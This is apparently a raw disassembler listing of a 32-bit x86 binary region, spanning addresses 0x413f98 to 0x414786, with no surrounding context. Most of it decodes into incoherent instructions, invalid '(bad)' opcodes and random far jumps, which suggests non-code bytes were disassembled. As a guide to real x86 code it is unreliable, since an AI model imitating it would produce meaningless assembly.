  413f98:	in     eax,0x49
  413f9a:	jno    0x413fde
  413f9c:	dec    esp
  413f9d:	sbb    BYTE PTR [eax],al
  413f9f:	ror    DWORD PTR [eax],1
  413fa1:	cvtps2pd xmm6,QWORD PTR [ecx]
  413fa4:	sbb    eax,0xc437791f
  413fa9:	mov    ds:0x18bcc1c4,eax
  413fae:	jbe    0x413f8d
  413fb0:	mov    bh,0x7e
  413fb2:	jae    0x413fc1
  413fb4:	pop    edx
  413fb5:	xor    bh,BYTE PTR [edx-0x6c]
  413fb8:	xor    esp,esp
  413fba:	(bad)  
  413fbb:	aaa    
  413fbc:	cmp    DWORD PTR [ebx+0x3d],eax
  413fbf:	hlt    
  413fc0:	xchg   DWORD PTR [ebx+0x28],esi
  413fc3:	aas    
  413fc4:	pop    edi
  413fc5:	arpl   WORD PTR [ebx+0x2],si
  413fc8:	outs   dx,BYTE PTR ds:[esi]
  413fc9:	mov    cl,0x70
  413fcb:	ds push edx
  413fcd:	or     ebp,DWORD PTR ds:0x4946d0f1
  413fd3:	lock fldcw WORD PTR [ebp-0x68b5bb5]
  413fda:	cmp    al,0xa9
  413fdc:	push   esi
  413fdd:	push   ecx
  413fde:	bound  esp,QWORD PTR [esi+0x43]
  413fe1:	das    
  413fe2:	aas    
  413fe3:	in     al,0xf
  413fe5:	cmc    
  413fe6:	push   esi
  413fe7:	jl     0x414062
  413fe9:	xchg   esp,eax
  413fea:	lds    ebx,FWORD PTR [esi+0x3f216c8f]
  413ff0:	cmc    
  413ff1:	int3   
  413ff2:	or     DWORD PTR [edi+0x76b337af],0x4b
  413ff9:	sub    ch,BYTE PTR [ebp-0x11c5c471]
  413fff:	sbb    DWORD PTR [eax+esi*8+0x17c2097a],ebp
  414006:	sar    bl,0x88
  414009:	xor    DWORD PTR [edx+0x3b],ebx
  41400c:	sar    BYTE PTR [eax],1
  41400e:	aad    0x55
  414010:	xor    eax,0xd29196ae
  414015:	mul    DWORD PTR [ebx+eiz*8]
  414018:	pusha  
  414019:	inc    esp
  41401a:	xchg   esp,eax
  41401b:	test   BYTE PTR [ecx+eiz*1],ah
  41401e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41401f:	jb     0x414040
  414021:	(bad)  
  414022:	(bad)  
  414023:	mov    ah,BYTE PTR [ebx+esi*2]
  414026:	and    eax,0x1da12c0b
  41402b:	mov    dh,0xdc
  41402d:	mov    cl,0x6e
  41402f:	lods   eax,DWORD PTR ds:[esi]
  414030:	pop    edi
  414031:	mov    esp,0x1ced5dd8
  414036:	or     DWORD PTR [edx-0x565bd0f5],ebp
  41403c:	mov    eax,0xdbc2930c
  414041:	pop    ds
  414042:	stos   BYTE PTR es:[edi],al
  414043:	dec    ebx
  414044:	(bad)  [esi+0xa512f46]
  41404a:	xor    eax,0xed9a01d1
  41404f:	mov    ?,ebx
  414051:	push   0x183ea011
  414056:	lahf   
  414057:	fs xor BYTE PTR gs:[ebp+0x480269c7],al
  41405f:	mov    ebx,0x8fdfbfc0
  414064:	shr    BYTE PTR [ebp+0x28],cl
  414067:	sub    BYTE PTR [esp+eiz*2-0x723cafe8],dl
  41406e:	ss pushf 
  414070:	push   ds
  414071:	sub    eax,0x48467b4e
  414076:	pop    edx
  414077:	mov    al,ds:0x15d64794
  41407c:	(bad)  [ecx]
  41407e:	jmp    0x4140df
  414080:	ror    DWORD PTR [ecx+0x7333ecd1],0x79
  414087:	push   0xffffff9a
  414089:	cmp    ah,BYTE PTR [edi+0x36f9840c]
  41408f:	sbb    eax,0x490b40f8
  414094:	aam    0xb0
  414096:	sbb    edx,eax
  414098:	push   edi
  414099:	push   ss
  41409a:	out    dx,eax
  41409b:	lahf   
  41409c:	popa   
  41409d:	jp     0x41410c
  41409f:	iret   
  4140a0:	pushf  
  4140a1:	and    DWORD PTR [esi+ecx*8-0x768e1703],ebp
  4140a8:	and    DWORD PTR [edi+0x26],ebx
  4140ab:	xor    eax,0x3375c1ed
  4140b0:	lods   eax,DWORD PTR ds:[esi]
  4140b1:	jns    0x414037
  4140b3:	and    al,dl
  4140b5:	or     al,0xe0
  4140b7:	out    0xa5,al
  4140b9:	jg     0x41408c
  4140bb:	pusha  
  4140bc:	and    cl,BYTE PTR [ebx-0x62]
  4140bf:	loopne 0x414120
  4140c1:	mov    ds:0x79b6a2e2,eax
  4140c6:	je     0x414121
  4140c8:	pop    esp
  4140c9:	xor    ecx,eax
  4140cb:	sub    al,0x77
  4140cd:	mov    ecx,0x74adf116
  4140d2:	loopne 0x4140e3
  4140d4:	mov    al,ds:0x40e19ddb
  4140d9:	adc    DWORD PTR gs:[eax],ebp
  4140dc:	push   ss
  4140dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140de:	hlt    
  4140df:	push   es
  4140e0:	and    BYTE PTR [ebp+0x813b73a],0xcd
  4140e7:	dec    edi
  4140e8:	addr16 js 0x414108
  4140eb:	push   edx
  4140ec:	in     eax,dx
  4140ed:	into   
  4140ee:	jno    0x4140c4
  4140f0:	xor    eax,0x339d6d7b
  4140f5:	lahf   
  4140f6:	cmp    al,0x89
  4140f8:	dec    eax
  4140f9:	jae    0x414083
  4140fb:	cmp    eax,0x517f1eb6
  414100:	push   ds
  414101:	stos   DWORD PTR es:[edi],eax
  414102:	mul    ah
  414104:	xchg   ecx,eax
  414105:	inc    eax
  414106:	fcomp  QWORD PTR [ecx]
  414108:	mov    esi,0x2cb84da3
  41410d:	lods   al,BYTE PTR es:[esi]
  41410f:	mov    ecx,0xa45e64f0
  414114:	mov    BYTE PTR [esi-0x19],ch
  414117:	lock xor eax,0x98d5e0a7
  41411d:	push   ss
  41411e:	adc    esi,esp
  414120:	stos   BYTE PTR es:[edi],al
  414121:	sub    dl,ah
  414123:	(bad)  
  414124:	popa   
  414125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414126:	push   ss
  414127:	popa   
  414128:	mov    ds:0xa80dc2a6,al
  41412d:	inc    ebp
  41412e:	jge    0x41416f
  414130:	aaa    
  414131:	pop    ebx
  414132:	sub    dl,BYTE PTR [edi-0x6d]
  414135:	add    eax,0xe2c0be30
  41413a:	jo     0x4141b7
  41413c:	ss retf 
  41413e:	aaa    
  41413f:	xchg   ebx,eax
  414140:	pop    eax
  414141:	jo     0x414158
  414143:	lock add DWORD PTR [edi],ebx
  414146:	cmp    BYTE PTR [edx],0x5f
  414149:	adc    BYTE PTR [edi+0x5fe87ff5],cl
  41414f:	es dec ebx
  414151:	sub    eax,0xc2adef99
  414156:	out    0x12,al
  414158:	mov    al,ds:0x833a3f82
  41415d:	ja     0x414123
  41415f:	mov    BYTE PTR gs:[esp+0x8cfd8ac],ch
  414167:	adc    al,0xee
  414169:	mov    edx,0x81524106
  41416e:	jno    0x41413e
  414170:	xor    al,0x9d
  414172:	imul   ax,WORD PTR [ecx],0xfff0
  414176:	push   esp
  414177:	sahf   
  414178:	test   al,0x16
  41417a:	inc    esp
  41417b:	add    dl,BYTE PTR [ecx+0x6da55208]
  414181:	popf   
  414182:	sub    al,0x41
  414184:	addr16 call 0xc4ba712b
  41418a:	jns    0x4141fa
  41418c:	call   DWORD PTR [esi-0x17]
  41418f:	dec    edx
  414190:	cmc    
  414191:	mov    cl,0x78
  414193:	dec    esp
  414194:	inc    edx
  414195:	sbb    DWORD PTR [ecx+0x31],0xffffffb5
  414199:	ficomp DWORD PTR [ebx]
  41419b:	inc    ecx
  41419c:	pop    ebx
  41419d:	pop    ebp
  41419e:	or     al,0xb
  4141a0:	pop    es
  4141a1:	push   ss
  4141a2:	adc    ebx,edi
  4141a4:	fcmovne st,st(3)
  4141a6:	cmp    dh,al
  4141a8:	es mov ah,0xad
  4141ab:	xchg   ebx,eax
  4141ac:	or     eax,0xf0bf155f
  4141b1:	xchg   esp,eax
  4141b2:	iret   
  4141b3:	in     al,dx
  4141b4:	enter  0xca3f,0x17
  4141b8:	cmp    dh,cl
  4141ba:	leave  
  4141bb:	jno    0x414185
  4141bd:	dec    ebx
  4141be:	mov    cl,BYTE PTR [edx+0x63]
  4141c1:	out    dx,eax
  4141c2:	cmp    BYTE PTR [ecx],al
  4141c4:	in     al,dx
  4141c5:	pop    ebx
  4141c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141c7:	pop    es
  4141c8:	aas    
  4141c9:	call   DWORD PTR [esi-0xb3d06d7]
  4141cf:	pop    es
  4141d0:	int    0x98
  4141d2:	repz sbb al,0x43
  4141d5:	(bad)  
  4141d7:	mov    ds:0x99ea701a,eax
  4141dc:	je     0x414217
  4141de:	mov    ds:0x5a515cf2,eax
  4141e3:	jg     0x4141b6
  4141e5:	inc    edx
  4141e6:	mov    bh,0x84
  4141e8:	jmp    0x414184
  4141ea:	sbb    bh,al
  4141ec:	jge    0x414239
  4141ee:	push   eax
  4141ef:	out    dx,eax
  4141f0:	sbb    eax,0x4461c561
  4141f5:	fld    DWORD PTR [esp+edi*4+0x50b11616]
  4141fc:	add    al,0x95
  4141fe:	xor    eax,0x824f11c4
  414203:	xor    edx,ebp
  414205:	mov    bl,0xd1
  414207:	sbb    al,ah
  414209:	mov    eax,0x65385646
  41420e:	cmp    edx,eax
  414210:	inc    ebx
  414211:	in     eax,dx
  414212:	xchg   DWORD PTR [esi-0x2],eax
  414215:	adc    al,0x38
  414217:	push   esp
  414218:	cdq    
  414219:	add    al,0x3e
  41421b:	icebp  
  41421c:	ds in  eax,dx
  41421e:	call   0xdd31:0x915af26f
  414225:	daa    
  414226:	and    DWORD PTR [esi],esi
  414228:	jae    0x41425b
  41422a:	sub    cl,BYTE PTR [edx+0x31]
  41422d:	inc    ebx
  41422e:	test   al,0x0
  414230:	or     ebp,DWORD PTR [edx]
  414232:	dec    ebx
  414233:	pop    DWORD PTR [eax]
  414235:	daa    
  414236:	jmp    0xffc3:0xb5c24e3f
  41423d:	add    BYTE PTR [ecx+edi*1+0x4f7903b4],dh
  414244:	fnstsw WORD PTR [esi]
  414246:	push   cs
  414247:	cs inc eax
  414249:	xchg   ecx,eax
  41424a:	imul   ecx,DWORD PTR [eax+0x67e095bc],0xd45af447
  414254:	sahf   
  414255:	aam    0x59
  414257:	sub    ch,BYTE PTR ds:0x2c88f803
  41425d:	retf   0xfa2b
  414260:	inc    edi
  414261:	stc    
  414262:	ror    BYTE PTR [edi],cl
  414264:	ins    DWORD PTR es:[edi],dx
  414265:	add    ch,al
  414267:	outs   dx,BYTE PTR ds:[esi]
  414268:	icebp  
  414269:	ret    
  41426a:	mov    ah,0xa7
  41426c:	mov    dh,0x67
  41426e:	test   ecx,0x3385ce3c
  414274:	stos   BYTE PTR es:[edi],al
  414275:	mov    al,0x9a
  414277:	into   
  414278:	cwde   
  414279:	cld    
  41427a:	jmp    0xf1bb:0xfb919657
  414281:	test   al,al
  414283:	das    
  414284:	ins    DWORD PTR es:[edi],dx
  414285:	rcl    DWORD PTR [edi],0x94
  414288:	inc    esi
  414289:	pop    eax
  41428a:	xchg   edi,eax
  41428b:	aas    
  41428c:	sbb    al,0xe
  41428e:	sub    eax,0x9665f87d
  414293:	jmp    0xb4:0x6d165143
  41429a:	push   0x4e
  41429c:	jae    0x4142f0
  41429e:	cdq    
  41429f:	out    0x2,eax
  4142a1:	add    BYTE PTR [ecx+0x43c96776],bh
  4142a7:	lahf   
  4142a8:	or     dh,BYTE PTR gs:[ebx]
  4142ab:	pusha  
  4142ac:	inc    esi
  4142ad:	xor    al,0xcc
  4142af:	nop
  4142b0:	dec    esp
  4142b1:	stos   DWORD PTR es:[edi],eax
  4142b2:	in     eax,0xe5
  4142b4:	cmp    esi,DWORD PTR [ebp+ebp*1-0x6e]
  4142b8:	push   ecx
  4142b9:	sbb    DWORD PTR [edi-0x73],eax
  4142bc:	and    cl,BYTE PTR [edi+0x1d]
  4142bf:	sub    ebp,DWORD PTR [ebp+0x61]
  4142c2:	mov    al,0xc0
  4142c4:	add    BYTE PTR [eax],ah
  4142c6:	outs   dx,BYTE PTR ds:[esi]
  4142c7:	iret   
  4142c8:	test   DWORD PTR [ebx-0x67],ecx
  4142cb:	or     eax,0x8663e398
  4142d0:	xchg   edx,eax
  4142d1:	pop    esp
  4142d2:	int    0x64
  4142d4:	mov    eax,ds:0x95cbb8e6
  4142d9:	jno    0x414299
  4142db:	ret    
  4142dc:	sbb    eax,DWORD PTR [ecx+edx*2-0x46]
  4142e0:	ss xchg edi,eax
  4142e2:	aad    0x86
  4142e4:	mov    ebx,0x44a29f86
  4142e9:	jno    0x4142c6
  4142eb:	push   edi
  4142ec:	hlt    
  4142ed:	push   0x9014ff6d
  4142f2:	repnz int3 
  4142f4:	mov    esi,0xd078d780
  4142f9:	jne    0x4142cf
  4142fb:	stc    
  4142fc:	pop    ds
  4142fd:	and    ch,bh
  4142ff:	xor    edx,DWORD PTR [ebx]
  414301:	jecxz  0x4142dd
  414303:	icebp  
  414304:	stc    
  414305:	mov    BYTE PTR [ecx-0x25d101e5],ah
  41430b:	adc    esp,DWORD PTR [edi-0x48]
  41430e:	lods   al,BYTE PTR ds:[esi]
  41430f:	in     eax,0x91
  414311:	fdiv   st(5),st
  414313:	push   ss
  414314:	dec    eax
  414315:	mov    ah,0x4e
  414317:	and    dh,dh
  414319:	sti    
  41431a:	loope  0x4142f0
  41431c:	fadd   QWORD PTR [ebx-0x14f2e075]
  414322:	sti    
  414323:	mov    cl,0x1f
  414325:	adc    DWORD PTR [ecx+esi*8],esp
  414328:	imul   eax,ebp,0x79f80385
  41432e:	mov    ch,0xcd
  414330:	jns    0x414383
  414332:	mov    bh,0x1
  414334:	sub    esi,DWORD PTR [esi+0x56]
  414337:	sbb    al,dl
  414339:	out    0xa5,eax
  41433b:	imul   esp,DWORD PTR ds:0x62d8dba3,0xffffffec
  414342:	push   edx
  414343:	mov    WORD PTR [esi-0x3802e949],?
  414349:	push   edi
  41434a:	push   ebx
  41434b:	out    dx,eax
  41434c:	rcr    DWORD PTR [edx+0x75],cl
  41434f:	add    BYTE PTR [eax],cl
  414351:	fs mov ebp,0xe94e9b9d
  414357:	cmp    ah,BYTE PTR [edi+0x24]
  41435a:	jl     0x4142ea
  41435c:	ret    0x6856
  41435f:	(bad)  
  414360:	(bad)  [edx+0x68]
  414363:	ret    
  414364:	cmp    BYTE PTR [ecx-0x2833fb35],0x74
  41436b:	dec    eax
  41436c:	lock mov cl,BYTE PTR [ebx-0x34]
  414370:	cmp    eax,0xabecf91d
  414375:	xor    ebp,DWORD PTR [edi]
  414377:	aad    0x4
  414379:	mov    bh,0x99
  41437b:	or     BYTE PTR [edx-0x1a],al
  41437e:	inc    esi
  41437f:	mov    ch,bl
  414381:	jb     0x4143c0
  414383:	xor    DWORD PTR [edx-0x52],ecx
  414386:	arpl   WORD PTR [edx-0xf],sp
  414389:	sub    DWORD PTR [ecx],ebx
  41438b:	outs   dx,BYTE PTR ds:[esi]
  41438c:	es inc ebx
  41438e:	sub    eax,DWORD PTR [eax-0x2f04e04e]
  414394:	add    ah,cl
  414396:	aam    0xc1
  414398:	cmp    BYTE PTR [ebp+0x7b],0xf9
  41439c:	pop    ds
  41439d:	repnz sbb ecx,edx
  4143a0:	movlps xmm1,QWORD PTR [esi+eiz*1-0x7fd05695]
  4143a8:	mov    BYTE PTR [eax+0x1545e0d0],bh
  4143ae:	pop    edx
  4143af:	add    edi,ebx
  4143b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143b2:	xor    cl,cl
  4143b4:	add    DWORD PTR [esi+ebp*2-0x48dd63ab],edx
  4143bb:	jmp    0x14ea11a1
  4143c0:	fisttp QWORD PTR [ebp-0x70]
  4143c3:	cmp    BYTE PTR [ebp+0x7f07d824],dh
  4143c9:	js     0x41441a
  4143cb:	(bad)  [esi]
  4143cd:	icebp  
  4143ce:	sbb    BYTE PTR [eax],ah
  4143d0:	sbb    ebp,DWORD PTR [eax-0x21]
  4143d3:	mov    al,0xb
  4143d5:	call   0x5c0a126e
  4143da:	fwait
  4143db:	pop    ebp
  4143dc:	add    eax,0xee76ac1a
  4143e1:	xor    ah,ch
  4143e3:	stos   DWORD PTR es:[edi],eax
  4143e4:	sbb    BYTE PTR [edi],dh
  4143e6:	xchg   edi,eax
  4143e7:	jns    0x4143a0
  4143e9:	add    DWORD PTR [ebx-0x5a0d540e],esp
  4143ef:	jl     0x4143a4
  4143f1:	add    al,0x5
  4143f3:	scas   eax,DWORD PTR es:[edi]
  4143f4:	cmp    edi,DWORD PTR [esi-0x615f3961]
  4143fa:	or     DWORD PTR [edx+eiz*1-0x2a],0xcbeb7900
  414402:	jbe    0x4143df
  414404:	leave  
  414405:	mov    esp,0xa47064dd
  41440a:	clc    
  41440b:	out    0xb8,eax
  41440d:	push   esi
  41440e:	ret    
  41440f:	(bad)  
  414410:	or     ebp,DWORD PTR [edx-0x6158da1]
  414416:	scas   eax,DWORD PTR es:[edi]
  414417:	jbe    0x41441a
  414419:	fcom   st(7)
  41441b:	sbb    edi,DWORD PTR [ebx+0x20]
  41441e:	es repz push esi
  414421:	xchg   DWORD PTR [ebx+0x31],ecx
  414424:	cli    
  414425:	outs   dx,BYTE PTR ds:[esi]
  414426:	rol    DWORD PTR [eax],1
  414428:	nop
  414429:	pop    ds
  41442a:	shl    DWORD PTR [esi-0x71689d40],1
  414430:	and    al,0x2
  414432:	repz push DWORD PTR [ebx+0x23]
  414436:	push   esi
  414437:	test   al,0xad
  414439:	pusha  
  41443a:	inc    edx
  41443b:	clc    
  41443c:	loope  0x414405
  41443e:	(bad)  
  414440:	jbe    0x414413
  414442:	jecxz  0x4143e7
  414444:	test   al,0x3b
  414446:	lods   eax,DWORD PTR ds:[esi]
  414447:	fs retf 
  414449:	call   0x354440cb
  41444e:	xor    edx,ebp
  414450:	mov    ecx,0x6fe30e7e
  414455:	or     eax,0x33171263
  41445a:	pusha  
  41445b:	jns    0x414477
  41445d:	mov    ds:0xecfbf12,al
  414462:	pop    es
  414463:	jnp    0x414461
  414465:	in     eax,0x90
  414467:	clc    
  414468:	mov    WORD PTR [esi],?
  41446a:	gs inc edi
  41446c:	jnp    0x4144a3
  41446e:	cmp    eax,0x1802bcd
  414473:	popf   
  414474:	pop    ecx
  414475:	test   al,0xcb
  414477:	dec    ebx
  414478:	mov    ecx,0xeb479ef3
  41447d:	shr    BYTE PTR [ebp+0x4143736a],0xca
  414484:	mov    al,ds:0x810914cf
  414489:	add    eax,DWORD PTR [ebx-0x2f]
  41448c:	or     DWORD PTR [ebx+0x7576df6d],esp
  414492:	xor    BYTE PTR [eax],cl
  414494:	mov    edx,fs
  414496:	xchg   BYTE PTR [esp+ebp*2-0xfa8f445],dl
  41449d:	shr    DWORD PTR [eax-0x11],cl
  4144a0:	sti    
  4144a1:	add    BYTE PTR [ebp+0x7b583d32],ah
  4144a7:	and    al,0xe8
  4144a9:	es xchg esi,eax
  4144ab:	stc    
  4144ac:	pop    es
  4144ad:	inc    esi
  4144ae:	jno    0x414516
  4144b0:	xchg   ebx,eax
  4144b1:	inc    ebx
  4144b2:	mov    edi,DWORD PTR [ecx+edx*8]
  4144b5:	cmp    edi,ebp
  4144b7:	mov    bl,0xab
  4144b9:	shl    bl,cl
  4144bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144bc:	out    0x25,eax
  4144be:	inc    ebx
  4144bf:	add    DWORD PTR [edx],ecx
  4144c1:	ins    DWORD PTR es:[edi],dx
  4144c2:	xchg   DWORD PTR ss:[esi-0x78fb3016],edi
  4144c9:	mov    ecx,0x8039a918
  4144ce:	dec    edi
  4144cf:	push   ds
  4144d0:	sub    BYTE PTR [ebx+0x7d],0x2a
  4144d4:	adc    dl,ch
  4144d6:	sbb    BYTE PTR [ecx-0x2bc94ce5],cl
  4144dc:	or     eax,0x5b4bb02b
  4144e1:	jbe    0x4144fa
  4144e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144e4:	sub    DWORD PTR [esi-0xe],esp
  4144e7:	out    dx,eax
  4144e8:	je     0x414512
  4144ea:	inc    edx
  4144eb:	adc    al,0x45
  4144ed:	dec    edi
  4144ee:	xchg   cx,ax
  4144f0:	fs push 0x449156a
  4144f6:	inc    ebp
  4144f7:	ret    0x1847
  4144fa:	cmp    bh,al
  4144fc:	imul   ebx,DWORD PTR [esi+0x230ea634],0x781190
  414506:	jmp    0xf044:0x97f84a71
  41450d:	rol    DWORD PTR [edi],cl
  41450f:	fdiv   st(0),st
  414511:	in     eax,0xd6
  414513:	pop    esi
  414514:	call   0x28c32cf1
  414519:	repnz les edx,FWORD PTR [ebx+0x2e9d9a08]
  414520:	sub    BYTE PTR [edx+0x4edeaac4],dh
  414526:	push   ss
  414527:	or     esi,DWORD PTR [edi+0x616e889c]
  41452d:	jo     0x414502
  41452f:	push   edi
  414530:	sar    BYTE PTR [eax-0x110b37b6],cl
  414536:	xor    BYTE PTR [ebx+eiz*8+0x4acfab20],bh
  41453d:	sar    al,cl
  41453f:	push   esi
  414540:	xor    bl,BYTE PTR [edx]
  414542:	jl     0x414541
  414544:	jmp    DWORD PTR [ebx+edi*8-0x5c]
  414548:	jp     0x414530
  41454a:	daa    
  41454b:	dec    edi
  41454c:	lods   eax,DWORD PTR ds:[esi]
  41454d:	push   ebp
  41454e:	mov    bh,0x70
  414550:	mov    ebp,?
  414552:	shl    BYTE PTR [ecx-0x59],1
  414555:	or     BYTE PTR [edx-0xc],bl
  414558:	(bad)  
  414559:	test   eax,0x32301f1d
  41455e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41455f:	adc    eax,0xbb34d0cc
  414564:	into   
  414565:	jae    0x414522
  414567:	popf   
  414568:	jnp    0x4144fa
  41456a:	mov    esi,DWORD PTR [ebp+0x18]
  41456d:	jmp    0xee33:0x612fadb3
  414574:	scas   eax,DWORD PTR es:[edi]
  414575:	cmp    eax,0x8682b237
  41457a:	jnp    0x41450f
  41457c:	scas   eax,DWORD PTR es:[edi]
  41457d:	cmc    
  41457e:	jae    0x414536
  414580:	or     edi,0xbb0c37c6
  414586:	pop    es
  414587:	xchg   ecx,eax
  414588:	push   ebx
  414589:	dec    ebp
  41458a:	sbb    al,0xec
  41458c:	push   esi
  41458d:	pop    ebx
  41458e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41458f:	test   DWORD PTR [edx+0x3e7b767e],esp
  414595:	pop    edi
  414596:	mov    dl,0x23
  414598:	dec    edi
  414599:	jo     0x4145ff
  41459b:	adc    ah,bl
  41459d:	dec    ebp
  41459e:	jmp    0x9d04:0xd3aefec9
  4145a5:	iret   
  4145a6:	push   ebx
  4145a7:	repz sub BYTE PTR [esi-0x6a265fd9],bh
  4145ae:	sbb    DWORD PTR [esp+eax*1+0x21],esp
  4145b2:	cmc    
  4145b3:	jmp    0x6d25:0x2422490d
  4145ba:	int    0x96
  4145bc:	(bad)  
  4145bd:	xchg   ebp,eax
  4145be:	int    0x69
  4145c0:	or     al,0xc2
  4145c2:	and    dl,al
  4145c4:	(bad)
  4145c7:	call   0xdf1939ee
  4145cc:	sub    BYTE PTR ss:[bp+di+0x3bf6],dh
  4145d2:	(bad)  
  4145d3:	sbb    al,0xb9
  4145d5:	pop    ebp
  4145d6:	retf   
  4145d7:	stos   BYTE PTR es:[edi],al
  4145d8:	adc    BYTE PTR [edx],cl
  4145da:	lahf   
  4145db:	loop   0x414618
  4145dd:	and    ah,BYTE PTR [edi+ebp*8]
  4145e0:	pop    ebp
  4145e1:	ret    
  4145e2:	into   
  4145e3:	jne    0x41464f
  4145e5:	loop   0x414665
  4145e7:	lods   eax,DWORD PTR ds:[esi]
  4145e8:	shl    BYTE PTR [ecx],cl
  4145ea:	shl    DWORD PTR [edx+0x1d],1
  4145ed:	sbb    dh,BYTE PTR [ebx-0x3f]
  4145f0:	push   ebx
  4145f1:	and    edi,ebp
  4145f3:	lock xor al,0x92
  4145f6:	jle    0x414598
  4145f8:	lds    eax,FWORD PTR [eax-0x27]
  4145fb:	cmp    BYTE PTR [ebx],al
  4145fd:	jmp    0xf422:0x6a7b359c
  414604:	mov    bh,0x7e
  414606:	jge    0x41460a
  414608:	add    ebx,esi
  41460a:	test   eax,0xafe7bcf2
  41460f:	inc    edi
  414610:	stc    
  414611:	call   0x97bc421f
  414616:	repnz xchg ebx,eax
  414618:	push   esp
  414619:	gs pop edx
  41461b:	dec    ebx
  41461c:	jl     0x414676
  41461e:	neg    DWORD PTR [ecx+ecx*8-0x31]
  414622:	and    eax,0x778897dc
  414627:	lahf   
  414628:	xchg   ecx,eax
  414629:	shl    BYTE PTR [ebx-0x15],0xa
  41462d:	add    ch,ah
  41462f:	dec    edi
  414630:	pop    ds
  414631:	cdq    
  414632:	ins    BYTE PTR es:[edi],dx
  414633:	adc    BYTE PTR [ebx],dh
  414635:	adc    eax,eax
  414637:	mov    edx,0x94fba443
  41463c:	mov    ss,WORD PTR [eax-0x58]
  41463f:	loope  0x414697
  414641:	xor    DWORD PTR [edi],edx
  414643:	cmp    al,0xa5
  414645:	push   ecx
  414646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414647:	enter  0x1114,0x69
  41464b:	shl    ah,1
  41464d:	nop
  41464e:	icebp  
  41464f:	fs das 
  414651:	ret    0xc22b
  414654:	add    bl,BYTE PTR [ebp-0x13]
  414657:	lea    ebp,[esi]
  414659:	daa    
  41465a:	call   0x20073b9
  41465f:	push   ebp
  414660:	mov    DWORD PTR [eax+edx*8-0x381edba1],ebp
  414667:	sub    BYTE PTR [ebx],0xea
  41466a:	pop    ds
  41466b:	cmp    eax,0x9b6f9b80
  414670:	sbb    DWORD PTR [esi-0x2d],0xdcb7bbac
  414677:	(bad)  
  414678:	sti    
  414679:	push   edx
  41467a:	mov    ds:0x38948bc3,eax
  41467f:	int    0x8a
  414681:	push   ecx
  414682:	mov    WORD PTR [eax],?
  414684:	push   ds
  414685:	add    al,0xa1
  414687:	outs   dx,BYTE PTR ds:[esi]
  414688:	and    al,0xa8
  41468a:	pop    esi
  41468b:	pop    ebp
  41468c:	inc    ecx
  41468d:	or     DWORD PTR [ebx],0xa999b68f
  414693:	or     ah,BYTE PTR [ebx-0x20]
  414696:	push   ebx
  414697:	mov    bh,0x56
  414699:	mov    dl,0xc9
  41469b:	dec    edi
  41469c:	jmp    0x4146c8
  41469e:	sub    ebp,DWORD PTR [ecx-0x32d057b9]
  4146a4:	sar    eax,1
  4146a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146a7:	rcr    cl,cl
  4146a9:	inc    esi
  4146aa:	sbb    BYTE PTR [edi],cl
  4146ac:	in     al,dx
  4146ad:	pcmpgtd mm0,QWORD PTR [ebp+ebx*8+0xa]
  4146b2:	xchg   ecx,eax
  4146b3:	icebp  
  4146b4:	xchg   edi,eax
  4146b5:	cmp    DWORD PTR [edx],edx
  4146b7:	fisubr DWORD PTR [edx]
  4146b9:	adc    al,0x0
  4146bb:	mov    WORD PTR ds:[edi+ebx*8-0x53c842d],ds
  4146c3:	int3   
  4146c4:	cmp    al,0x6e
  4146c6:	rcr    BYTE PTR [edx],1
  4146c8:	mov    WORD PTR [edi-0x4934373a],ds
  4146ce:	jmp    0x1793d22a
  4146d3:	cmp    eax,0xaaba3be9
  4146d8:	cli    
  4146d9:	(bad)  
  4146db:	push   0xffffffc9
  4146dd:	ss and eax,eax
  4146e0:	inc    bp
  4146e2:	(bad)  
  4146e3:	mov    bh,0xf0
  4146e5:	dec    ebx
  4146e6:	push   esp
  4146e7:	xchg   ebx,edi
  4146e9:	xchg   edi,eax
  4146ea:	cs (bad) 
  4146ec:	in     al,0xb0
  4146ee:	mov    ch,0x4d
  4146f0:	(bad)  
  4146f1:	sbb    eax,0x1a0308a4
  4146f6:	lds    edx,FWORD PTR [esi-0xac50073]
  4146fc:	neg    DWORD PTR [edx+ebp*1]
  4146ff:	addr16 inc ecx
  414701:	arpl   ax,di
  414703:	mov    ds:0x48eebb8b,al
  414708:	adc    ebp,DWORD PTR [eax-0x4f560bfb]
  41470e:	fldcw  WORD PTR [ecx+0x2c]
  414711:	or     eax,0xb4832100
  414716:	ja     0x41471b
  414718:	xor    DWORD PTR [edi],ebp
  41471a:	fcmovb st,st(1)
  41471c:	mov    bh,0xe9
  41471e:	ins    BYTE PTR es:[edi],dx
  41471f:	mov    esp,0xd392df74
  414724:	push   ds
  414725:	push   es
  414726:	stos   BYTE PTR es:[edi],al
  414727:	inc    eax
  414728:	and    ebp,DWORD PTR [esp+eax*1-0x3412de35]
  41472f:	xchg   ebp,eax
  414730:	(bad)  
  414733:	push   ebx
  414734:	mov    edi,0x61557a08
  414739:	(bad)  
  41473a:	iret   
  41473b:	add    eax,0x32c20f5e
  414740:	retf   0x6118
  414743:	dec    esp
  414744:	shl    DWORD PTR [edi-0x34],1
  414747:	es clc 
  414749:	fld    QWORD PTR [esi]
  41474b:	ja     0x414721
  41474d:	lods   al,BYTE PTR ds:[esi]
  41474e:	jmp    FWORD PTR [esi-0x24a3e705]
  414754:	jbe    0x41473c
  414756:	iret   
  414757:	pop    edi
  414758:	data16 cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  41475b:	sahf   
  41475c:	jb     0x414756
  41475e:	test   BYTE PTR [ecx*8+0x682f7fea],ah
  414765:	test   DWORD PTR [ebp+0x5b7394cc],ecx
  41476b:	jns    0x41472c
  41476d:	inc    ecx
  41476e:	xchg   ebx,eax
  41476f:	cs inc ebx
  414771:	in     eax,dx
  414772:	xor    al,0x68
  414774:	ret    
  414775:	push   ebx
  414776:	adc    eax,0x7ac9af34
  41477b:	cmp    al,0x8
  41477d:	mov    esp,0xf1ae22cb
  414782:	ss dec esp
  414784:	nop
  414785:	hlt    
  414786:	push   ebp
